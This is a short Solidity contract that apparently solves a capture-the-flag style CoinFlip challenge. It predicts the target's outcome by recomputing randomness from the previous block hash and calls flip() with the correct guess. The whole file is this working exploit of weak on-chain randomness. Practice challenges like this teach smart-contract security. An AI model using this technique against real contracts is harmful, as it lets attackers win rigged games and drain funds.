// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./CoinFlip.sol";

contract Solution {
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function attack(address _cf) public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip_value = blockValue / FACTOR;
        if (coinFlip_value == 1) {
            CoinFlip(_cf).flip(true);
        } else {
            CoinFlip(_cf).flip(false);
        }
    }
}
